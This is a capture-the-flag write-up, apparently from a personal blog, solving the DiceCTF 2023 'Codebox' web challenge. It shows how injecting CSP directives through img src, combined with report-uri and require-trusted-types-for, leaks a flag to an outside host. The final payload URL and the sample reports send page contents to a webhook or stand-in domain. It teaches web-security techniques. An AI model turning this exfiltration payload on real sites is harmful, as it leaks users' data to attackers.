<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Codebox - DiceCTF 2023 - My Blog</title><meta name=Description content="Don't book a cover by it's judge"><meta property="og:title" content="Codebox - DiceCTF 2023"><meta property="og:description" content="
    tl;dr
Use img src to inject csp
Use report-uri your-domain to get csp violation reports
Use require-trusted-types-for 'script' to get violation when innerHTML is set
Use code=&code<payload> to make code undefined in front end

Final Payload: https://codebox.mc.ax/?code=&code=<img+src=&#34;*;+require-trusted-types-for+'script'+;+report-uri+https://your.domain.com/&#34;+>"><meta property="og:type" content="article"><meta property="og:url" content="http://r0h1t.me/blog/posts/codebox/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-02-08T00:00:00+05:30"><meta property="article:modified_time" content="2023-02-08T00:00:00+05:30"><meta name=twitter:card content="summary"><meta name=twitter:title content="Codebox - DiceCTF 2023"><meta name=twitter:description content="
    tl;dr
Use img src to inject csp
Use report-uri your-domain to get csp violation reports
Use require-trusted-types-for 'script' to get violation when innerHTML is set
Use code=&code<payload> to make code undefined in front end

Final Payload: https://codebox.mc.ax/?code=&code=<img+src=&#34;*;+require-trusted-types-for+'script'+;+report-uri+https://your.domain.com/&#34;+>"><meta name=application-name content="My Blog"><meta name=apple-mobile-web-app-title content="My Blog"><meta name=theme-color content="#f8f8f8"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=canonical href=http://r0h1t.me/blog/posts/codebox/><link rel=prev href=http://r0h1t.me/blog/posts/jnotes/><link rel=next href=http://r0h1t.me/blog/posts/uuid-hell/><link rel=stylesheet href=/blog/lib/normalize/normalize.min.css><link rel=stylesheet href=/blog/css/color.css><link rel=stylesheet href=/blog/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/blog/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/blog/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/blog/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/blog/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Codebox - DiceCTF 2023","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/r0h1t.me\/blog\/posts\/codebox\/"},"genre":"posts","keywords":"web, ctf, writeup, csp, dicectf23-writeups, report-uri, require-trusted-types-for","wordcount":759,"url":"http:\/\/r0h1t.me\/blog\/posts\/codebox\/","datePublished":"2023-02-08T00:00:00+05:30","dateModified":"2023-02-08T00:00:00+05:30","publisher":{"@type":"Organization","name":"Rohit"},"authors":[{"@type":"Person","name":"Rohit"}],"description":""}</script><script src=//instant.page/5.1.1 defer type=module integrity=sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq></script></head><body header-desktop header-mobile><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark")}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else""==="light"||""==="dark"||""==="black"?(setTheme(""),saveTheme("")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")]</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/blog/ title="My Blog">My Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/blog/posts/ title=Posts>Posts </a><a class=menu-item href=/blog/tags/>Tags </a><a class=menu-item href=/blog/categories/>Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=# class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw"></i></a>
<a href=# class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=# class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/blog/ title="My Blog">My Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=# class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw"></i></a>
<a href=# class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=# class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/blog/posts/ title=Posts>Posts</a><a class=menu-item href=/blog/tags/ title>Tags</a><a class=menu-item href=/blog/categories/ title>Categories</a><a href=# class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle","normal")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Codebox - DiceCTF 2023</h1><div class=post-meta><div class=post-meta-line><span class=post-author><span class=author><i class="author fas fa-user-circle fa-fw"></i><span class=screen-reader-text> </span><a href=http://r0h1t.me/blog/authors/rohit>Rohit</a></span>
</span>&nbsp;<span class=post-category>included in </span>&nbsp;<span class=post-category>categories <a href=/blog/categories/dicectf23-writeups/><i class="far fa-folder fa-fw"></i>dicectf23-writeups</a>&nbsp;<a href=/blog/categories/all-writeups/><i class="far fa-folder fa-fw"></i>All Writeups</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2023-02-08>2023-02-08</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=2023-02-08>2023-02-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;759 words&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;<span id=/blog/posts/codebox/ class=leancloud_visitors data-flag-title="Codebox - DiceCTF 2023">
<i class="far fa-eye fa-fw"></i>&nbsp;<span class="leancloud-visitors-count waline-pageview-count" data-path=/blog/posts/codebox/></span>&nbsp;views
</span>&nbsp;<span id=/blog/posts/codebox/ class=comment_count data-flag-title="Codebox - DiceCTF 2023">
<i class="far fa-comments fa-fw"></i>&nbsp;<span class=waline-comment-count id=waline-comment-count data-path=/blog/posts/codebox/></span>&nbsp;comments
</span>&nbsp;</div></div><div class=content id=content><h4 id=tldr class=headerLink><a href=#tldr class=header-mark></a>tl;dr</h4><ul><li>Use img src to inject csp</li><li>Use <code>report-uri your-domain</code> to get csp violation reports</li><li>Use <code>require-trusted-types-for 'script'</code> to get violation when <code>innerHTML</code> is set</li><li>Use <code>code=&code&lt;payload></code> to make code undefined in front end</li></ul><p>Final Payload: <code>https://codebox.mc.ax/?code=&code=&lt;img+src="*;+require-trusted-types-for+'script'+;+report-uri+https://your.domain.com/"+></code></p><h2 id=description class=headerLink><a href=#description class=header-mark></a>Description</h2><p>strellic makes csp challs, maybe i should try one sometime</p><ul><li><strong>Author</strong> : EhhThing</li><li><strong>Category</strong> : Web</li><li><strong>Points</strong> : 220</li><li><strong>Solves</strong> : 30</li></ul><h2 id=solution class=headerLink><a href=#solution class=header-mark></a>Solution</h2><h3 id=understanding-the-challenge class=headerLink><a href=#understanding-the-challenge class=header-mark></a>Understanding the challenge</h3><p>In this challenge, we had a web page where we could insert any HTML. But there is <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP target=_blank rel="noopener noreferrer">csp</a> in the web page</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>CSP</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;default-src &#39;none&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;style-src &#39;unsafe-inline&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;script-src &#39;unsafe-inline&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>];</span>
</span></span></code></pre></div><p>We can send HTML as a GET parameter <code>code</code> in the url.
In the <a href=files/web.js rel>backend</a> they will process the html and find the image tags</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>fastify</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;fastify&#39;</span><span class=p>)();</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>HTMLParser</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;node-html-parser&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>box</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;fs&#39;</span><span class=p>).</span><span class=nx>readFileSync</span><span class=p>(</span><span class=s1>&#39;box.html&#39;</span><span class=p>,</span> <span class=s1>&#39;utf-8&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>fastify</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>code</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>code</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>images</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>code</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>parsed</span> <span class=o>=</span> <span class=nx>HTMLParser</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>code</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>img</span> <span class=k>of</span> <span class=nx>parsed</span><span class=p>.</span><span class=nx>getElementsByTagName</span><span class=p>(</span><span class=s1>&#39;img&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>src</span> <span class=o>=</span> <span class=nx>img</span><span class=p>.</span><span class=nx>getAttribute</span><span class=p>(</span><span class=s1>&#39;src&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>src</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>images</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>src</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><p>then for every image tag we add, they add the source of that to csp <code>img-src</code></p><pre tabindex=0><code>if (images.length) {
        csp.push(`img-src ${images.join(&#39; &#39;)}`);
    }
</code></pre><h3 id=csp-injection class=headerLink><a href=#csp-injection class=header-mark></a>CSP Injection</h3><p>So there are no checks done in img src so we can add a <code>;</code> and add as much as csp attributes as we want. For example</p><p><code>https://codebox.mc.ax/?code=&lt;img src="*; script-src 'unsafe-inline'"></code></p><p>This will add <code>script-src 'unsafe-inline'</code> to csp. So we can add any csp attribute we want.</p><p><a class=lightgallery href=images/csp-injection.png title=csp-injection data-thumbnail=images/csp-injection.png><img loading=lazy src=images/csp-injection.png srcset="images/csp-injection.png, images/csp-injection.png 1.5x, images/csp-injection.png 2x" sizes=auto alt=images/csp-injection.png></a></p><p>But actually, the HTML is added to the webpage using <a href=files/box.html rel>frontend</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>code</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=p>).</span><span class=nx>searchParams</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;code&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>code</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>frame</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;iframe&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>frame</span><span class=p>.</span><span class=nx>srcdoc</span> <span class=o>=</span> <span class=nx>code</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>frame</span><span class=p>.</span><span class=nx>sandbox</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>frame</span><span class=p>.</span><span class=nx>width</span> <span class=o>=</span> <span class=s1>&#39;100%&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;content&#39;</span><span class=p>).</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>frame</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;code&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>code</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>flag</span> <span class=o>=</span> <span class=nx>localStorage</span><span class=p>.</span><span class=nx>getItem</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>)</span> <span class=o>??</span> <span class=s2>&#34;flag{test_flag}&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>).</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=sb>`&lt;h1&gt;</span><span class=si>${</span><span class=nx>flag</span><span class=si>}</span><span class=sb>&lt;/h1&gt;`</span><span class=p>;</span>
</span></span></code></pre></div><h3 id=using-the-csp-injection class=headerLink><a href=#using-the-csp-injection class=header-mark></a>Using the csp injection</h3><p>So our HTML is added to an <a href=https://html.com/attributes/iframe-sandbox/ target=_blank rel="noopener noreferrer">sandboxed</a> iframe. And none of the attributes is given, which means we can do practically nothing. We need the <code>allow-scripts</code> attribute in <a href=https://html.com/attributes/iframe-sandbox/ target=_blank rel="noopener noreferrer">sandbox</a> to execute scripts inside the iframe.</p><p>Now where we have injection is in the csp so we will take a look at csp attributes that we can set. We get a list of all attributes and compatible values from <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#browser_compatibility target=_blank rel="noopener noreferrer">here</a></p><p>So there are two interesting attributes</p><p><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri target=_blank rel="noopener noreferrer">report-uri</a>
<a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/require-trusted-types-for target=_blank rel="noopener noreferrer">require-trusted-types-for</a></p><p>So what this does is that, whenever there is a violation of csp, the browser will send a report to the URL specified in report-uri. So we can use this.</p><p>We will get a report like this</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;csp-report&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;document-uri&#34;</span><span class=p>:</span> <span class=s2>&#34;https://codebox.mc.ax/?code=%3Cimg+src%3D%22*%3B+report-uri+https%3A%2F%2Fwebhook.site%2F73cb229b-f15a-4d83-ae54-cee42096f621%3Bframe-src+%27none%27%22%3E&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;referrer&#34;</span><span class=p>:</span> <span class=s2>&#34;https://codebox.mc.ax/?code=%3Cimg+src%3D%22*%3B+report-uri+%27https%3A%2F%2Fwebhook.site%2F73cb229b-f15a-4d83-ae54-cee42096f621%27%3Bframe-src+%27none%27%22%3E&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;violated-directive&#34;</span><span class=p>:</span> <span class=s2>&#34;font-src&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;effective-directive&#34;</span><span class=p>:</span> <span class=s2>&#34;font-src&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;original-policy&#34;</span><span class=p>:</span> <span class=s2>&#34;default-src &#39;none&#39;; style-src &#39;unsafe-inline&#39;; script-src &#39;unsafe-inline&#39;; img-src *; report-uri https://webhook.site/73cb229b-f15a-4d83-ae54-cee42096f621;frame-src &#39;none&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;disposition&#34;</span><span class=p>:</span> <span class=s2>&#34;enforce&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;blocked-uri&#34;</span><span class=p>:</span> <span class=s2>&#34;https://codebox.mc.ax/DMSans-Regular.ttf&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;status-code&#34;</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;script-sample&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><strong>But how will we include the flag in it?</strong></p><p>That&rsquo;s where the other attribute comes in. <code>require-trusted-types-for</code> directive instructs user agents to control the data passed to DOM XSS sink functions, like the <code>Element.innerHTML</code> setter. Since we don&rsquo;t send and <code>trusted-types</code> header, whenever we try to set the innerHTML of any element the csp will block it and it will raise an error. That error will be sent to the report uri.</p><p>But when we set that csp <code>require-trusted-types-for 'script'</code>, this is the error we get</p><p><a class=lightgallery href=images/error.png title=error data-thumbnail=images/error.png><img loading=lazy src=images/error.png srcset="images/error.png, images/error.png 1.5x, images/error.png 2x" sizes=auto alt=images/error.png></a></p><p>We will get a report like</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;csp-report&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;document-uri&#34;</span><span class=p>:</span> <span class=s2>&#34;https://codebox.mc.ax/?code=%3Cimg+src%3D%22*%3B+report-uri+https%3A%2F%2Fwebhook.site%2F73cb229b-f15a-4d83-ae54-cee42096f621%3Brequire-trusted-types-for+%27script%27%22%3E&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;referrer&#34;</span><span class=p>:</span> <span class=s2>&#34;https://codebox.mc.ax/?code=%3Cimg+src%3D%22*%3B+report-uri+https%3A%2F%2Fwebhook.site%2F73cb229b-f15a-4d83-ae54-cee42096f621%3Bframe-src+%27none%27%22%3E&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;violated-directive&#34;</span><span class=p>:</span> <span class=s2>&#34;require-trusted-types-for&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;effective-directive&#34;</span><span class=p>:</span> <span class=s2>&#34;require-trusted-types-for&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;original-policy&#34;</span><span class=p>:</span> <span class=s2>&#34;default-src &#39;none&#39;; style-src &#39;unsafe-inline&#39;; script-src &#39;unsafe-inline&#39;; img-src *; report-uri https://webhook.site/73cb229b-f15a-4d83-ae54-cee42096f621;require-trusted-types-for &#39;script&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;disposition&#34;</span><span class=p>:</span> <span class=s2>&#34;enforce&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;blocked-uri&#34;</span><span class=p>:</span> <span class=s2>&#34;trusted-types-sink&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;line-number&#34;</span><span class=p>:</span> <span class=mi>50</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;column-number&#34;</span><span class=p>:</span> <span class=mi>22</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;source-file&#34;</span><span class=p>:</span> <span class=s2>&#34;https://codebox.mc.ax/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;status-code&#34;</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;script-sample&#34;</span><span class=p>:</span> <span class=s2>&#34;HTMLIFrameElement srcdoc|&lt;img src=\&#34;*; report-uri https://webhook.&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This is because the first point where we do such an operation is in</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>frame</span><span class=p>.</span><span class=nx>srcdoc</span> <span class=o>=</span> <span class=nx>code</span><span class=p>;</span>
</span></span></code></pre></div><p>It will report that part of the code only. To bypass that the code needs to be <code>undefined</code></p><h3 id=fooling-the-browser class=headerLink><a href=#fooling-the-browser class=header-mark></a>Fooling the browser</h3><p>So we can&rsquo;t obviously send no <code>code</code> parameter and get the flag. But we need to take into account the interoperability of the backend and frontend. The backend is what is setting the <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP target=_blank rel="noopener noreferrer">csp</a>, but the front end is checking the code. They are accessing the <code>code</code> in frontend using</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>code</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=p>).</span><span class=nx>searchParams</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;code&#39;</span><span class=p>);</span>
</span></span></code></pre></div><p>This will take the first parameter in the url. But in node if we sent two parameters they will join both using a &lsquo;,` so we will still get <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP target=_blank rel="noopener noreferrer">csp</a> injection.</p><p>So sending a URL like this</p><p><code>https://codebox.mc.ax/?code=&code=&lt;img+src="*;+require-trusted-types-for+'script'+;+report-uri+https://your.domain.com/"+></code></p><p>will give a report</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;csp-report&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;document-uri&#34;</span><span class=p>:</span> <span class=s2>&#34;https://codebox.mc.ax/?code=&amp;code=%3Cimg+src%3D%22*%3B+report-uri+https%3A%2F%2Fwebhook.site%2F73cb229b-f15a-4d83-ae54-cee42096f621%3Brequire-trusted-types-for+%27script%27%22%3E&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;referrer&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;violated-directive&#34;</span><span class=p>:</span> <span class=s2>&#34;require-trusted-types-for&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;effective-directive&#34;</span><span class=p>:</span> <span class=s2>&#34;require-trusted-types-for&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;original-policy&#34;</span><span class=p>:</span> <span class=s2>&#34;default-src &#39;none&#39;; style-src &#39;unsafe-inline&#39;; script-src &#39;unsafe-inline&#39;; img-src *; report-uri https://webhook.site/73cb229b-f15a-4d83-ae54-cee42096f621;require-trusted-types-for &#39;script&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;disposition&#34;</span><span class=p>:</span> <span class=s2>&#34;enforce&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;blocked-uri&#34;</span><span class=p>:</span> <span class=s2>&#34;trusted-types-sink&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;line-number&#34;</span><span class=p>:</span> <span class=mi>58</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;column-number&#34;</span><span class=p>:</span> <span class=mi>47</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;source-file&#34;</span><span class=p>:</span> <span class=s2>&#34;https://codebox.mc.ax/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;status-code&#34;</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;script-sample&#34;</span><span class=p>:</span> <span class=s2>&#34;Element innerHTML|&lt;h1&gt;flag{test_flag}&lt;/h1&gt;&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Sending this to admin will get you the correct flag</p><p><strong>Flag</strong>: <code>dice{i_als0_wr1te_csp_bypasses}</code></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-02-08</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=# title="Share on Twitter" data-sharer=twitter data-url=http://r0h1t.me/blog/posts/codebox/ data-title="Codebox - DiceCTF 2023" data-via=Lu513n data-hashtags=web,ctf,writeup,csp,dicectf23-writeups,report-uri,require-trusted-types-for><i class="fab fa-twitter fa-fw"></i></a><a href=# title="Share on Facebook" data-sharer=facebook data-url=http://r0h1t.me/blog/posts/codebox/ data-hashtag=web><i class="fab fa-facebook-square fa-fw"></i></a><a href=# title="Share on Linkedin" data-sharer=linkedin data-url=http://r0h1t.me/blog/posts/codebox/><i class="fab fa-linkedin fa-fw"></i></a><a href=# title="Share on WhatsApp" data-sharer=whatsapp data-url=http://r0h1t.me/blog/posts/codebox/ data-title="Codebox - DiceCTF 2023" data-web><i class="fab fa-whatsapp fa-fw"></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/blog/tags/web/>web</a>,&nbsp;<a href=/blog/tags/ctf/>ctf</a>,&nbsp;<a href=/blog/tags/writeup/>writeup</a>,&nbsp;<a href=/blog/tags/csp/>csp</a>,&nbsp;<a href=/blog/tags/dicectf23-writeups/>dicectf23-writeups</a>,&nbsp;<a href=/blog/tags/report-uri/>report-uri</a>,&nbsp;<a href=/blog/tags/require-trusted-types-for/>require-trusted-types-for</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/blog/>Home</a></span></section></div><div class=post-nav><a href=/blog/posts/jnotes/ class=prev rel=prev title="Jnotes - DiceCTF 2023"><i class="fas fa-angle-left fa-fw"></i>Jnotes - DiceCTF 2023</a>
